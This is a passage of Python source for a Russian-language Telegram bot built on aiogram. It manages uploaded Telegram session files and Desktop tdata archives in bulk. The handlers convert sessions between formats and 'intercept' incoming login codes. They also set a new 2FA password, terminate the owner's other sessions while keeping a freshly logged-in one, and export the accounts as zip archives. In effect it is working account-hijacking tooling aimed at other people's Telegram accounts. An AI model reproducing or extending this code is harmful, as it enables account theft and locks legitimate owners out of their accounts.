async def process_admin_id(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        await message.answer("Только владелец может добавлять админов.")
        await state.clear()
        return

    try:
        admin_id = int(message.text.strip())
    except (ValueError, AttributeError):
        await message.answer("Отправьте числовой Telegram ID.")
        return

    if admin_id in OWNER_IDS:
        await message.answer("Этот ID уже владелец.")
        await state.clear()
        await show_admins_menu(message)
        return

    await state.update_data(new_admin_id=admin_id)
    await state.set_state(SessionStates.waiting_for_admin_days)
    await message.answer("На сколько дней выдать доступ? Отправьте число. 0 значит навсегда.")

@router.message(SessionStates.waiting_for_admin_days)
async def process_admin_days(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        await message.answer("Только владелец может добавлять админов.")
        await state.clear()
        return

    try:
        days = int(message.text.strip())
    except (ValueError, AttributeError):
        await message.answer("Отправьте число дней. 0 значит навсегда.")
        return

    if days < 0:
        await message.answer("Срок не может быть отрицательным. 0 значит навсегда.")
        return

    data = await state.get_data()
    admin_id = int(data["new_admin_id"])
    admins = [admin for admin in cleanup_expired_admins() if admin["id"] != admin_id]
    entry = build_admin_entry(admin_id, days)
    admins.append(entry)
    save_admins(admins)

    await state.clear()
    await message.answer(f"Админ добавлен: {get_admin_label(entry)}")
    await show_admins_menu(message)

@router.callback_query(F.data == "admin_remove_menu")
async def action_admin_remove_menu(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    admins = cleanup_expired_admins()
    builder = InlineKeyboardBuilder()
    for admin in admins:
        builder.row(types.InlineKeyboardButton(text=get_admin_label(admin), callback_data=f"admin_remove:{admin['id']}"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data="admins_menu"))
    await callback.message.edit_text("Выберите админа для удаления:", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("admin_remove:"))
async def action_admin_remove(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    admin_id = int(callback.data.split(":")[1])
    admins = [item for item in cleanup_expired_admins() if item["id"] != admin_id]
    save_admins(admins)
    await callback.answer("Админ удален")
    await show_admins_menu(callback.message, is_edit=True)

@router.callback_query(F.data == "admins_menu")
async def action_admins_menu(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return
    await show_admins_menu(callback.message, is_edit=True)

@router.callback_query(F.data == "add_session")
async def add_session_menu(callback: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Telethon (.session)", callback_data="add_type_telethon"))
    builder.row(types.InlineKeyboardButton(text="Pyrogram (.session)", callback_data="add_type_pyrogram"))
    builder.row(types.InlineKeyboardButton(text="Telegram Desktop tdata (.zip)", callback_data="add_type_tdata"))
    builder.row(types.InlineKeyboardButton(text="Массовая tdata (.zip)", callback_data="add_type_bulk_tdata"))
    builder.row(types.InlineKeyboardButton(text="Массовые Telethon (.session)", callback_data="add_type_bulk_sessions"))
    builder.row(types.InlineKeyboardButton(text="JSON / String", callback_data="add_type_json"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data="back_to_main"))
    
    await callback.message.edit_text("Выберите тип добавляемой сессии:", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("add_type_"))
async def process_add_type(callback: types.CallbackQuery, state: FSMContext):
    session_type = callback.data.removeprefix("add_type_")
    await state.update_data(current_type=session_type)
    
    if session_type == "json":
        await callback.message.answer("Отправьте JSON строку или Session String:")
        await state.set_state(SessionStates.waiting_for_json)
    elif session_type == "bulk_tdata":
        batch_id = f"bulk_{callback.from_user.id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        await state.update_data(
            batch_id=batch_id,
            bulk_items=[],
            bulk_errors=[],
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
        await callback.message.answer(
            "Кидайте zip-архивы по одному или пачкой файлов. Один zip может содержать много аккаунтов: "
            "папки по ID, номеру или имени, а внутри каждой папка tdata либо сразу key_datas. "
            "Когда закончите, нажмите анализ и конвертацию.",
            reply_markup=builder.as_markup()
        )
        await state.set_state(SessionStates.waiting_for_bulk_tdata)
    elif session_type == "bulk_sessions":
        batch_id = f"bulk_sessions_{callback.from_user.id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        await state.update_data(
            batch_id=batch_id,
            bulk_items=[],
            bulk_errors=[],
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk_sessions:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
        await callback.message.answer(
            "Кидайте Telethon .session файлы. После загрузки нажмите анализ и конвертацию.",
            reply_markup=builder.as_markup()
        )
        await state.set_state(SessionStates.waiting_for_bulk_sessions)
    elif session_type == "tdata":
        await callback.message.answer("Отправьте .zip архив с папкой tdata или ее содержимым:")
        await state.set_state(SessionStates.waiting_for_file)
    else:
        await callback.message.answer(f"Отправьте файл .session для {session_type.capitalize()}:")
        await state.set_state(SessionStates.waiting_for_file)
    await callback.answer()

@router.message(SessionStates.waiting_for_file, F.document)
async def handle_session_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lib_type = data.get("current_type")

    if lib_type == "tdata":
        if not message.document.file_name.lower().endswith(".zip"):
            await message.answer("Ошибка: для tdata отправьте архив .zip.")
            return

        name_prefix = f"tdata_{message.from_user.id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"

        try:
            archive_result = await save_tdata_document_multi(message, name_prefix)
            saved_items = archive_result["saved"]
        except Exception as e:
            await message.answer(f"Ошибка: не удалось загрузить tdata: {e}")
            return

        await state.clear()
        await message.answer(
            f"Архив обработан локально.\n"
            f"Найдено tdata: {len(saved_items)}\n"
            "Состояние аккаунтов не проверялось. Подключение к Telegram не выполнялось."
        )
        if len(saved_items) == 1:
            await show_session_menu(message, saved_items[0]["tdata_name"])
        else:
            builder = InlineKeyboardBuilder()
            builder.row(types.InlineKeyboardButton(text="Открыть список", callback_data="list_sessions"))
            await message.answer("Все найденные tdata добавлены отдельно.", reply_markup=builder.as_markup())
        return
    
    file_name = f"{lib_type}_{message.document.file_name}"
    file_path = os.path.join(SESSION_DIR, file_name)
    
    file = await bot.get_file(message.document.file_id)
    await bot.download_file(file.file_path, file_path)
    
    await state.clear()
    await message.answer("Проверяю сессию и определяю номер...")
    info = await remember_account(file_name)
    phone = info.get("phone") if info else "номер не удалось определить"
    await message.answer(f"Готово: сессия {file_name} успешно загружена.")
    await message.answer(f"Номер: {phone}")
    await show_session_menu(message, file_name)

@router.message(SessionStates.waiting_for_bulk_tdata, F.document)
async def handle_bulk_tdata_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    batch_id = data.get("batch_id")
    items = data.get("bulk_items", [])
    errors = data.get("bulk_errors", [])

    if not message.document.file_name.lower().endswith(".zip"):
        errors.append({
            "file": message.document.file_name,
            "error": "не zip-архив",
        })
        await state.update_data(bulk_errors=errors)
        await message.answer("Пропустил файл: для tdata нужен .zip")
        return

    name_prefix = f"tdata_{message.from_user.id}_{batch_id}_{len(items) + 1}"

    try:
        archive_result = await save_tdata_document_multi(message, name_prefix)
        saved_items = archive_result["saved"]
        items.extend(item["tdata_name"] for item in saved_items)
        await state.update_data(bulk_items=items)
    except Exception as e:
        errors.append({
            "file": message.document.file_name,
            "error": str(e),
        })
        await state.update_data(bulk_errors=errors)
        await message.answer(f"Не удалось добавить {message.document.file_name}: {e}")
        return

    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
    await message.answer(
        f"В этом zip найдено tdata: {len(saved_items)}\n"
        f"Всего аккаунтов в пачке: {len(items)}\n"
        f"Ошибок при загрузке: {len(errors)}\n"
        "Состояние аккаунтов не проверялось. Подключение к Telegram не выполнялось.",
        reply_markup=builder.as_markup()
    )

@router.message(SessionStates.waiting_for_bulk_sessions, F.document)
async def handle_bulk_session_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    batch_id = data.get("batch_id")
    items = data.get("bulk_items", [])
    errors = data.get("bulk_errors", [])
    original_name = message.document.file_name

    if not original_name.lower().endswith(".session"):
        errors.append({"file": original_name, "error": "не .session файл"})
        await state.update_data(bulk_errors=errors)
        await message.answer("Пропустил файл: нужен Telethon .session")
        return

    source_base = sanitize_filename(os.path.splitext(original_name)[0])
    session_name = f"telethon_{batch_id}_{len(items) + 1}_{source_base}.session"
    session_path = os.path.join(SESSION_DIR, session_name)

    try:
        file = await bot.get_file(message.document.file_id)
        await bot.download_file(file.file_path, session_path)
        update_history(session_name, {"source_base": source_base})
        items.append(session_name)
        await state.update_data(bulk_items=items)
    except Exception as e:
        errors.append({"file": original_name, "error": str(e)})
        await state.update_data(bulk_errors=errors)
        await message.answer(f"Не удалось добавить {original_name}: {e}")
        return

    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk_sessions:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
    await message.answer(
        f"Добавлено .session: {len(items)}\nОшибок при загрузке: {len(errors)}",
        reply_markup=builder.as_markup()
    )

@router.message(SessionStates.waiting_for_json)
async def handle_json_string(message: types.Message, state: FSMContext):
    string_data = message.text
    file_name = f"json_{message.from_user.id}_{hash(string_data)}.session"
    
    with open(os.path.join(SESSION_DIR, file_name), "w") as f:
        f.write(string_data)
        
    await state.clear()
    update_history(file_name)
    await message.answer("JSON/String сессия сохранена.")
    await show_session_menu(message, file_name)

@router.callback_query(F.data.startswith("list_sessions"))
async def list_sessions(callback: types.CallbackQuery):
    sync_history_with_files()
    files = list_saved_accounts()
    
    if not files:
        await callback.answer("Список сессий пуст", show_alert=True)
        return

    page = 0
    if ":" in callback.data:
        try:
            page = int(callback.data.split(":")[1])
        except ValueError:
            page = 0

    total_pages = max(1, (len(files) + SESSIONS_PER_PAGE - 1) // SESSIONS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    page_files = files[page * SESSIONS_PER_PAGE:(page + 1) * SESSIONS_PER_PAGE]

    builder = InlineKeyboardBuilder()
    for f in page_files:
        builder.row(types.InlineKeyboardButton(text=format_account_label(f), callback_data=f"manage:{account_key(f)}"))

    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton(text="Назад", callback_data=f"list_sessions:{page - 1}"))
    nav_buttons.append(types.InlineKeyboardButton(text=f"{page + 1}/{total_pages}", callback_data=f"list_sessions:{page}"))
    if page < total_pages - 1:
        nav_buttons.append(types.InlineKeyboardButton(text="Вперед", callback_data=f"list_sessions:{page + 1}"))
    builder.row(*nav_buttons)
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))
    
    await callback.message.edit_text(
        f"Список сессий и tdata\nВсего: {len(files)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("manage:"))
async def manage_callback(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    await show_session_menu(callback.message, session_name, is_edit=True)

async def show_session_menu(message: types.Message, session_name: str, is_edit=False):
    builder = InlineKeyboardBuilder()
    session_type = get_session_type(session_name)
    key = account_key(session_name)
    builder.row(types.InlineKeyboardButton(text="Получить код", callback_data=f"get_code:{key}"))
    builder.row(types.InlineKeyboardButton(text="Обновить номер", callback_data=f"refresh_account:{key}"))
    if session_type == "tdata":
        builder.row(types.InlineKeyboardButton(text="Конвертировать в .session", callback_data=f"convert_tdata:{key}"))
    else:
        if session_type == "telethon":
            builder.row(types.InlineKeyboardButton(text="Конвертировать в tdata", callback_data=f"convert_session_tdata:{key}"))
            builder.row(types.InlineKeyboardButton(text="Оставить новую, завершить старые", callback_data=f"terminate_old_confirm:{key}"))
        builder.row(types.InlineKeyboardButton(text="Установить 2FA", callback_data=f"setup_2fa:{key}"))
    builder.row(types.InlineKeyboardButton(text="Удалить из бота", callback_data=f"delete_local_confirm:{key}"))
    builder.row(types.InlineKeyboardButton(text="Завершить сессию", callback_data=f"terminate:{key}"))
    builder.row(types.InlineKeyboardButton(text="К списку", callback_data="list_sessions"))
    
    text = f"Управление аккаунтом\n\n{format_account_details(session_name)}"
    
    if is_edit:
        await message.edit_text(text, reply_markup=builder.as_markup())
    else:
        await message.answer(text, reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("get_code:"))
async def action_get_code(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    lib_type = get_session_type(session_name)
    
    await callback.answer("Перехват кода...")
    path = os.path.join(SESSION_DIR, session_name)
    
    code = await get_last_code(path, lib_type)
    history = load_history()
    info = history.get(session_name, {})
    info["last_code_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    history[session_name] = info
    save_history(history)
    
    builder = InlineKeyboardBuilder()
    key = account_key(session_name)
    builder.row(types.InlineKeyboardButton(text="Обновить", callback_data=f"get_code:{key}"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data=f"manage:{key}"))
    
    await callback.message.edit_text(f"Результат проверки кода:\n\n{code}", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("refresh_account:"))
async def action_refresh_account(callback: types.CallbackQuery):
    session_name = resolve_account_identifier(callback.data.split(":", 1)[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    await callback.answer("Обновляю номер...")
    info = await remember_account(session_name)
    if not info:
        await callback.message.answer("Не удалось определить номер. Проверьте, что сессия живая.")
        return

    await callback.message.answer(f"Номер обновлен: {info.get('phone') or 'номер скрыт/не найден'}")
    await show_session_menu(callback.message, session_name)

@router.callback_query(F.data.startswith("convert_tdata:"))
async def action_convert_tdata(callback: types.CallbackQuery):
    tdata_name = resolve_account_identifier(callback.data.split(":", 1)[1])
    if not tdata_name:
        await callback.answer("tdata не найдена", show_alert=True)
        return

    await callback.answer("Конвертация tdata...")

    try:
        result = await convert_tdata_account(tdata_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка конвертации: {e}")
        return

    phone = result.get("phone") or "не проверялся"
    await callback.message.answer(f"tdata сконвертирована в {result['session_name']}\nНомер: {phone}")
    await callback.message.answer_document(
        types.FSInputFile(result["session_path"], filename=result["session_name"]),
        caption="Готовая Telethon .session"
    )
    await show_session_menu(callback.message, result["session_name"])

@router.callback_query(F.data.startswith("convert_session_tdata:"))
async def action_convert_session_tdata(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    await callback.answer("Конвертация в tdata...")

    try:
        result = await convert_session_to_tdata(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка обратной конвертации: {e}")
        return

    phone = result.get("phone") or "без проверки номера"
    await callback.message.answer(f"Сессия сконвертирована в tdata\nНомер: {phone}")
    await callback.message.answer_document(
        types.FSInputFile(result["zip_path"], filename=result["zip_name"]),
        caption="Готовая tdata в zip-архиве"
    )

@router.callback_query(F.data.startswith("finish_bulk:"))
async def action_finish_bulk(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    batch_id = callback.data.split(":")[1]

    if data.get("batch_id") != batch_id:
        await callback.answer("Пачка не найдена или уже завершена", show_alert=True)
        return

    items = data.get("bulk_items", [])
    upload_errors = data.get("bulk_errors", [])
    if not items:
        await callback.answer("Сначала отправьте хотя бы одну tdata", show_alert=True)
        return

    await callback.answer("Анализ и конвертация...")
    progress_message = await callback.message.answer(
        f"Начал последовательный анализ: {len(items)} tdata\n"
        "Подключение к аккаунтам не выполняется."
    )

    converted = []
    convert_errors = []
    for index, tdata_name in enumerate(items, start=1):
        try:
            result = await convert_tdata_account(tdata_name)
            converted.append(result)
        except Exception as e:
            convert_errors.append({
                "tdata_name": tdata_name,
                "error": str(e),
            })

        if index % 25 == 0 or index == len(items):
            await progress_message.edit_text(
                f"Обработано: {index}/{len(items)}\n"
                f"Успешно: {len(converted)}\n"
                f"Ошибок: {len(convert_errors)}\n"
                "Аккаунты не подключались."
            )

    batches = load_batches()
    batches[batch_id] = {
        "created_at": data.get("created_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_count": len(items),
        "upload_errors": upload_errors,
        "converted": converted,
        "convert_errors": convert_errors,
    }
    save_batches(batches)
    await state.clear()

    builder = InlineKeyboardBuilder()
    if converted:
        builder.row(types.InlineKeyboardButton(text="Получить архив .session", callback_data=f"get_bulk_sessions_zip:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    await callback.message.answer(
        "Массовая обработка завершена\n\n"
        f"Всего tdata: {len(items)}\n"
        f"Успешно: {len(converted)}\n"
        f"Ошибок загрузки: {len(upload_errors)}\n"
        f"Ошибок конвертации: {len(convert_errors)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("get_bulk_sessions_zip:"))
async def action_get_bulk_sessions(callback: types.CallbackQuery):
    batch_id = callback.data.split(":", 1)[1]
    batch = load_batches().get(batch_id)
    if not batch:
        await callback.answer("Пачка не найдена", show_alert=True)
        return

    converted = batch.get("converted", [])
    if not converted:
        await callback.answer("В этой пачке нет успешных сессий", show_alert=True)
        return

    await callback.answer("Собираю архив...")
    zip_name, zip_path = build_bulk_sessions_zip(batch_id, converted)
    await callback.message.answer_document(
        types.FSInputFile(zip_path, filename=zip_name),
        caption=f"Архив с .session: {len(converted)} аккаунтов"
    )
    await callback.message.answer("Архив с сессиями отправлен.")

@router.callback_query(F.data.startswith("finish_bulk_sessions:"))
async def action_finish_bulk_sessions(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    batch_id = callback.data.split(":", 1)[1]

    if data.get("batch_id") != batch_id:
        await callback.answer("Пачка не найдена или уже завершена", show_alert=True)
        return

    items = data.get("bulk_items", [])
    upload_errors = data.get("bulk_errors", [])
    if not items:
        await callback.answer("Сначала отправьте хотя бы одну .session", show_alert=True)
        return

    await callback.answer("Анализ и конвертация...")
    await callback.message.answer(f"Начал обработку: {len(items)} .session")

    converted = []
    convert_errors = []
    for index, session_name in enumerate(items, start=1):
        try:
            result = await convert_session_account_to_tdata(session_name)
            converted.append(result)
            phone = result.get("phone") or "номер не найден"
            await callback.message.answer(f"{index}/{len(items)} готово: {phone}")
        except Exception as e:
            convert_errors.append({"session_name": session_name, "error": str(e)})
            await callback.message.answer(f"{index}/{len(items)} ошибка: {session_name}\n{e}")

    batches = load_batches()
    batches[batch_id] = {
        "kind": "session_to_tdata",
        "created_at": data.get("created_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_count": len(items),
        "upload_errors": upload_errors,
        "converted": converted,
        "convert_errors": convert_errors,
    }
    save_batches(batches)
    await state.clear()

    builder = InlineKeyboardBuilder()
    if converted:
        builder.row(types.InlineKeyboardButton(text="Получить tdata.zip", callback_data=f"get_bulk_tdata:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    await callback.message.answer(
        "Массовая конвертация .session завершена\n\n"
        f"Всего: {len(items)}\n"
        f"Успешно: {len(converted)}\n"
        f"Ошибок загрузки: {len(upload_errors)}\n"
        f"Ошибок конвертации: {len(convert_errors)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("get_bulk_tdata:"))
async def action_get_bulk_tdata(callback: types.CallbackQuery):
    batch_id = callback.data.split(":", 1)[1]
    batch = load_batches().get(batch_id)
    if not batch:
        await callback.answer("Пачка не найдена", show_alert=True)
        return

    converted = batch.get("converted", [])
    if not converted:
        await callback.answer("Нет успешно сконвертированных tdata", show_alert=True)
        return

    await callback.answer("Отправляю архивы...")
    await callback.message.answer(f"Отправляю tdata.zip: {len(converted)}")

    sent = 0
    for index, result in enumerate(converted, start=1):
        zip_path = result.get("zip_path")
        if not zip_path or not os.path.exists(zip_path):
            continue
        await callback.message.answer_document(
            types.FSInputFile(zip_path, filename=result.get("zip_name")),
            caption=f"{index}. {result.get('phone') or 'номер не найден'}"
        )
        sent += 1

    await callback.message.answer(f"Готово. Отправлено архивов: {sent}")

@router.callback_query(F.data.startswith("setup_2fa:"))
async def action_setup_2fa(callback: types.CallbackQuery, state: FSMContext):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    await state.update_data(target_session=session_name)
    await state.set_state(SessionStates.waiting_for_2fa)
    
    await callback.message.answer(f"Введите новый облачный пароль (2FA) для {session_name}:")
    await callback.answer()

@router.callback_query(F.data.startswith("delete_local_confirm:"))
async def action_delete_local_confirm(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    key = account_key(session_name)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Да, удалить из бота", callback_data=f"delete_local:{key}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data=f"manage:{key}"))
    await callback.message.edit_text(
        "Удалить из бота?\n\n"
        f"{format_account_details(session_name)}\n\n"
        "Аккаунт в Telegram не будет завершен. Будут удалены только локальные файлы и запись из списка.",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("delete_local:"))
async def action_delete_local(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    try:
        delete_local_account(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка удаления из бота: {e}")
        return

    await callback.message.edit_text(f"{session_name} удалена из бота. Аккаунт не завершался.")

@router.callback_query(F.data.startswith("terminate_old_confirm:"))
async def action_terminate_old_confirm(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    key = account_key(session_name)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Да, оставить новую", callback_data=f"terminate_old:{key}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data=f"manage:{key}"))
    await callback.message.edit_text(
        "Подтвердите действие.\n\n"
        "Бот оставит самую новую сессию аккаунта, которая НЕ является текущей сессией чекера. "
        "Все остальные старые сессии будут завершены. После этого текущая сессия чекера тоже выйдет из аккаунта "
        "и будет удалена из бота.\n\n"
        "Нажимайте только после того, как уже вошли в нужную новую сессию по коду.",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("terminate_old:"))
async def action_terminate_old(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    if get_session_type(session_name) != "telethon":
        await callback.answer("Доступно только для Telethon .session", show_alert=True)
        return

    path = os.path.join(SESSION_DIR, session_name)
    await callback.answer("Завершаю старые сессии...")

    try:
        result = await terminate_old_authorizations_keep_latest(path)
        if os.path.exists(path):
            os.remove(path)
        remove_from_history(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка завершения старых сессий: {e}")
        return

    kept = result.get("kept")
    kept_text = "новая сессия не найдена"
    if kept:
        kept_text = f"{kept.get('app_name') or 'unknown'} | {kept.get('device_model') or 'unknown'} | {kept.get('date_active') or ''}"

    await callback.message.edit_text(
        "Готово.\n\n"
        f"Завершено старых сессий: {result['terminated_old']}\n"
        f"Оставлена: {kept_text}\n"
        "Сессия чекера завершена и удалена из бота."
    )

@router.message(SessionStates.waiting_for_2fa)
async def process_2fa_input(message: types.Message, state: FSMContext):
    data = await state.get_data()
    session_name = data.get("target_session")
    password = message.text
    
    lib_type = get_session_type(session_name)
    if lib_type == "tdata":
        await message.answer("Для tdata сначала выполните конвертацию в .session, затем установите 2FA.")
        await state.clear()
        await show_session_menu(message, session_name)
        return

    path = os.path.join(SESSION_DIR, session_name)
    
    success = await set_cloud_password(path, password, lib_type)
    
    if success:
        await message.answer(f"2FA успешно установлен: {password}")
    else:
        await message.answer("Ошибка при установке 2FA. Проверьте логи.")
    
    await state.clear()
    await show_session_menu(message, session_name)

@router.callback_query(F.data.startswith("terminate:"))
async def action_terminate(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    path = os.path.join(SESSION_DIR, session_name)
    lib_type = get_session_type(session_name)
    
    await callback.answer("Завершение сессии...")
    
    try:
        if lib_type == "tdata":
            shutil.rmtree(path)
            remove_from_history(session_name)
            await callback.message.edit_text(f"tdata {session_name} удалена.")
            return
        elif lib_type == "telethon":
            async with TelegramClient(path, API_ID, API_HASH) as client:
                await client.log_out()
        else:
            async with PyroClient(get_pyrogram_session_name(path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                await app.log_out()
        
        if os.path.exists(path):
            os.remove(path)
        remove_from_history(session_name)
        
        await callback.message.edit_text(f"Сессия {session_name} полностью завершена и удалена.")
    except Exception as e:
        await callback.message.answer(f"Ошибка при удалении: {e}")

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить сессию", callback_data="add_session"))
    builder.row(types.InlineKeyboardButton(text="Список сессий", callback_data="list_sessions"))
    await callback.message.edit_text("Выберите действие:", reply_markup=builder.as_markup())

# --- ЗАПУСК ---
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен")
